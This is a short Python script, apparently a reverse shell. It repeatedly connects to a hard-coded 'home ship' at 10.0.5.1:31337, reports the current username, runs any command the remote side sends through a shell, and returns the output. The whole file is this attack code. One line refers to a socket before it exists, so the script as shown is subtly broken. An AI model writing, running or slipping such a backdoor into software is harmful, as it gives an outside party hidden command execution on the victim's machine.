#!/usr/bin/python

import socket,subprocess,time,getpass,fcntl,struct

HOST = "10.0.5.1"     # The home ship
PORT = 31337          # The same port as used by the server
LOCALIP = socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s', "eth0"))[20:24])

while 1:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((HOST, PORT))
	except: 
		time.sleep(5)
		continue

	s.send(getpass.getuser())

	while 1:
	     data = s.recv(1024)
	     if data == "quit\n": break
	     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	     stdout_value = proc.stdout.read() + proc.stderr.read()
	     s.send(stdout_value)
        
	s.close()